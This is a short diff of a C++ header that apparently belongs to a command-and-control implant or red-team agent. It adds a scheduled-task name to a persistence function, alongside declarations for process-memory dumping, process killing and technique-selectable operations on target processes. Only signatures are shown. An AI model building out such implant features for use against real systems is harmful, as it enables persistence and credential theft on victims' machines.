@@ -174,7 +174,7 @@ namespace Task
     std::wstring Mv(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest);
     std::wstring Net(State::PSTATE pState);
     std::wstring Pe(State::PSTATE pState, const std::wstring& wTargetProcess, const std::wstring& wSrc, const std::wstring& wTechnique);
-    std::wstring Persist(State::PSTATE pState, const std::wstring& wTechnique);
+    std::wstring Persist(State::PSTATE pState, const std::wstring& wTechnique, const std::wstring& wSchTaskName);
     std::wstring Procdump(State::PSTATE pState, const std::wstring& wPid);
     std::wstring PsKill(State::PSTATE pState, const std::wstring& wPid);
     std::wstring PsLs(State::PSTATE pState, const std::wstring& wFilter, const std::wstring& wExclude);
